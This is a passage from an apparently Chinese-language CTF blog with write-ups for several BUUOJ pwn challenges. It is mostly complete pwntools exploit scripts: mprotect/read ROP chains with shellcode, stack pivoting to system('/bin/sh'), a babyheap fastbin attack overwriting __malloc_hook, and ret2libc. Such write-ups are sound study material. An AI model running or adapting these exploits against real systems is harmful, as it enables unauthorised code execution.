<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line">sh = elf.process()</span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28576</span>)</span><br><span class="line"></span><br><span class="line">pop3_ret = <span class="number">0x804951D</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pop esi</span></span><br><span class="line"><span class="string">pop edi</span></span><br><span class="line"><span class="string">pop ebp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">mem_addr = <span class="number">0x80EB000</span> <span class="comment">#可读可写的内存,但不可执行</span></span><br><span class="line">mem_size = <span class="number">0x1000</span>    <span class="comment">#通过调试出来的值</span></span><br><span class="line">mem_proc = <span class="number">0x7</span>       <span class="comment">#可代表可读可写可执行</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload_01 = <span class="string">'A'</span> * <span class="number">0x38</span></span><br><span class="line">payload_01 += p32(mprotect_addr)</span><br><span class="line">payload_01 += p32(pop3_ret) <span class="comment">#执行完mprotect的返回地址,使esp往下+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mprotect 的三个参数</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#mprotect函数参数1 修改的内存地址</span></span><br><span class="line">payload_01 += p32(mem_size)   <span class="comment">#mprotect函数参数2 修改的内存大小</span></span><br><span class="line">payload_01 += p32(mem_proc)   <span class="comment">#mprotect函数参数3 修改的权限</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(read_addr) <span class="comment">#执行完pop3_ret后弹到read地址</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(pop3_ret)  <span class="comment">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read 的三个参数</span></span><br><span class="line">payload_01 += p32(<span class="number">0</span>)     <span class="comment">#read函数参数1 ,从输入端读取</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#读取到的内容复制到指向的内存里</span></span><br><span class="line">payload_01 += p32(<span class="number">0x100</span>) <span class="comment">#读取大小</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#执行完read后ret esi</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload_01)</span><br><span class="line">payload_sh = asm(shellcraft.sh(),arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line"></span><br><span class="line">sh.sendline(payload_sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="8-not-the-same-3dsctf-2016"><a href="#8-not-the-same-3dsctf-2016" class="headerlink" title="8.not_the_same_3dsctf_2016"></a>8.not_the_same_3dsctf_2016</h2><p>同上一个题，只是数据换了一下，注意偏移</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./1'</span>)</span><br><span class="line">sh = elf.process()</span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27353</span>)</span><br><span class="line"></span><br><span class="line">pop3_ret = <span class="number">0x0806fcf0</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pop esi</span></span><br><span class="line"><span class="string">pop edi</span></span><br><span class="line"><span class="string">pop ebp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">mem_addr = <span class="number">0x80EB000</span> <span class="comment">#可读可写的内存,但不可执行</span></span><br><span class="line">mem_size = <span class="number">0x1000</span>    <span class="comment">#通过调试出来的值</span></span><br><span class="line">mem_proc = <span class="number">0x7</span>       <span class="comment">#可代表可读可写可执行</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload_01 = <span class="string">'A'</span> * (<span class="number">0x2d</span>)</span><br><span class="line">payload_01 += p32(mprotect_addr)</span><br><span class="line">payload_01 += p32(pop3_ret) <span class="comment">#执行完mprotect的返回地址,使esp往下+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mprotect 的三个参数</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#mprotect函数参数1 修改的内存地址</span></span><br><span class="line">payload_01 += p32(mem_size)   <span class="comment">#mprotect函数参数2 修改的内存大小</span></span><br><span class="line">payload_01 += p32(mem_proc)   <span class="comment">#mprotect函数参数3 修改的权限</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(read_addr) <span class="comment">#执行完pop3_ret后弹到read地址</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(pop3_ret)  <span class="comment">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read 的三个参数</span></span><br><span class="line">payload_01 += p32(<span class="number">0</span>)     <span class="comment">#read函数参数1 ,从输入端读取</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#读取到的内容复制到指向的内存里</span></span><br><span class="line">payload_01 += p32(<span class="number">0x100</span>) <span class="comment">#读取大小</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#执行完read后ret esi</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload_01)</span><br><span class="line">payload_sh = asm(shellcraft.sh(),arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line"></span><br><span class="line">sh.sendline(payload_sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="9-ez-pz-hackover-2016"><a href="#9-ez-pz-hackover-2016" class="headerlink" title="9.ez_pz_hackover_2016"></a>9.ez_pz_hackover_2016</h2><p>此题位ret2shellcode</p>
<p>但是不知道为真么无法调用s所在栈的shellcode</p>
<p>只能利用copy进去的覆盖了s之前的内容的shellcode</p>
<p>为两个参数加ret加ebp加三个参数共7*4=0x1c</p>
<p>指向stack_addr-0x1c这里才可，但是为啥s的栈不行呢，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',27543)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Yippie, lets crash: 0x"</span>)</span><br><span class="line"></span><br><span class="line">stack_addr=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(stack_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"crashme\x00"</span>+<span class="string">'a'</span>*<span class="number">18</span>+p32(stack_addr<span class="number">-0x1c</span>)+shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x8048601")</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x80485f8")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="10-ciscn-2019-es-2"><a href="#10-ciscn-2019-es-2" class="headerlink" title="10.ciscn_2019_es_2"></a>10.ciscn_2019_es_2</h2><p>32位程序，开了NX保护（堆栈不可执行）</p>
<p>看程序可以发现存在两次写入以及printf</p>
<p>我们发现有个hack函数。但是溢出后发现并不能获取flag</p>
<p>因此我们可以写入shell</p>
<p>但同时，我们发现我们能输入的字符数量不多</p>
<p>因此我们可以利用栈迁移来进行getshell</p>
<h3 id="先补充知识点：栈迁移"><a href="#先补充知识点：栈迁移" class="headerlink" title="先补充知识点：栈迁移"></a>先补充知识点：栈迁移</h3><p><a href="https://blog.csdn.net/zszcr/article/details/79841848" target="_blank" rel="noopener">https://blog.csdn.net/zszcr/article/details/79841848</a></p>
<p>可以根据这篇博客学习怎样使用栈迁移以及他的重复循环利用方法</p>
<p>总之：</p>
<p>1.使用leave_ret</p>
<ul>
<li><p>栈迁移主要是为了解决可溢出空间大小不足的问题</p>
</li>
<li><p>原理：覆盖ebp为fake_ebp，然后利用leavel ; ret ; 把esp劫持到fake_ebp上去</p>
</li>
<li><p>leave ret相当于</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov $esp, $ebp; 用ebp的值写入esp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop $ebp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop $eip</span><br></pre></td></tr></table></figure>

<p>2.模板</p>
<p>payload=’a’ * 4或者8或者要迁移目标的ebp/rbp地址 + ret（想要执行的函数）+leave_ret + 参数参数…以此类推</p>
<p>若想重复挟持可以使用read函数，详见上面的网址</p>
<p>本题：</p>
<p>1.我们先使用printf泄露我们的ebp</p>
<p>2.ebp即为我们的栈地址，可以通过调试获取esp相对于栈地址的偏移，也可以自己想，，</p>
<p>3.构造payload，因为题目中有system，所以不用泄露libc地址</p>
<p>直接栈向前迁移，然后调用system执行我们写入的/bin/sh即可</p>
<p>具体解释在exp中</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sys_plt=0x8048400 </span></span><br><span class="line"></span><br><span class="line">sys_add=<span class="number">0x8048559</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x20</span>+<span class="string">'bbbbbbbb'</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">print(hex(ebp))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload2=('a'*8+p32(ebp-0x24)+'bbbb'+p32(sys_plt)+'cccc'+p32(ebp-0x1c)+'/bin/sh\x00').ljust(0x28,'p')+p32(ebp-0x2c)</span></span><br><span class="line"><span class="comment">#这里我们使用的是sys_plt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=(<span class="string">'a'</span>*<span class="number">8</span>+p32(ebp<span class="number">-0x24</span>)+<span class="string">'bbbb'</span>+p32(sys_add)+p32(ebp<span class="number">-0x20</span>)+<span class="string">'/bin/sh\x00'</span>).ljust(<span class="number">0x28</span>,<span class="string">'p'</span>)+p32(ebp<span class="number">-0x2c</span>)</span><br><span class="line"><span class="comment">#这里我们使用的是程序自带的指令call system</span></span><br><span class="line"><span class="comment">#我们来看这个payload，我们将ebp覆盖为ebp-0x2c，（偏移根据调试得到的），就将栈向前到了bbbb之前，</span></span><br><span class="line"><span class="comment">#bbbb就是新的ebp，ret就是sys_add,（这里不需要构造返回地址），然后参数为ebp-0x1c处的字符串，即为我们的</span></span><br><span class="line"><span class="comment">#/bin/sh，成功getshell</span></span><br><span class="line"><span class="comment">#注意：</span></span><br><span class="line"><span class="comment">#这里的原来的栈的ret没有覆盖为leave_ret的原因是本来就是leave_ret</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">"b *0x80485fc"</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>完成，撒花=、=</p>
<h2 id="11-2017-0ctf-babyheap"><a href="#11-2017-0ctf-babyheap" class="headerlink" title="11.2017 0ctf babyheap"></a>11.2017 0ctf babyheap</h2><p>方法一：</p>
<p>1，使用unsort bin修露libc</p>
<p>2.使用malloc_hook与one gadget  getshell</p>
<p>方法二：</p>
<p>1.通过堆块重叠泄露libc基地址</p>
<p>2.使用malloc_hook与one gadget  getshell</p>
<p>参考博客：</p>
<p><a href="https://blog.csdn.net/qq_29343201/article/details/66476135" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/66476135</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./pwn'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line"><span class="comment">#ip = ''</span></span><br><span class="line"><span class="comment">#port = ''</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">	p.sendline(str(len(content)))</span><br><span class="line">	p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="comment">#leek libc</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=0</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=1</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=2</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=3</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#index=4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload1)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload2)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload3)</span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#这里是为了防止top chunk合并free的small bin（index=4）</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line"><span class="comment">#p.recvuntil('\x00' * 0x)</span></span><br><span class="line">main_arena = u64(p.recv(<span class="number">8</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">"main_arena: "</span>+hex(main_arena))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x7fffff3f4b78</span> - <span class="number">88</span> - <span class="number">0x7fffff030000</span></span><br><span class="line">log.info(<span class="string">"offset: "</span>+hex(offset))</span><br><span class="line">libc_base = main_arena - <span class="number">88</span> -offset</span><br><span class="line">log.success(<span class="string">"libc_base: "</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">"malloc_hook: "</span>+hex(malloc_hook))</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"><span class="keyword">print</span> hex(one_gadget)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload4 = p64(malloc_hook<span class="number">-0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload4)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x60</span>)<span class="comment">#这里是我们的malloc_hook</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload4 = p8(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload4)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0x50</span>)<span class="comment">#getshell</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="12-铁人三项第五赛区-rop"><a href="#12-铁人三项第五赛区-rop" class="headerlink" title="12.铁人三项第五赛区 rop"></a>12.铁人三项第五赛区 rop</h2><p>注意32位程序调用函数时要构造返回地址，有时还需要注意堆栈平衡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./2'</span></span><br><span class="line"><span class="comment">#libc_name = ''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'29633'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">libc_start_main_add = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main_add = <span class="number">0x80484c6</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'aaaa'</span> + p32(write_plt) +p32(main_add) + p32(<span class="number">1</span>) + p32(libc_start_main_add) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_start = u32(p.recv(<span class="number">4</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"libc_start: "</span>+hex(libc_start))</span><br><span class="line">libc=LibcSearcher(<span class="string">'__libc_start_main'</span>,int(libc_start))</span><br><span class="line">libc_base = libc_start - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_add = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">log.success(<span class="string">"libc_base: "</span>+hex(libc_base))</span><br><span class="line">log.success(<span class="string">"system_add: "</span>+hex(sys_add))</span><br><span class="line">log.success(<span class="string">"bin_sh_add: "</span>+hex(bin_sh_add))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'aaaa'</span> + p32(sys_add)+ p32(main_add) + p32(bin_sh_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

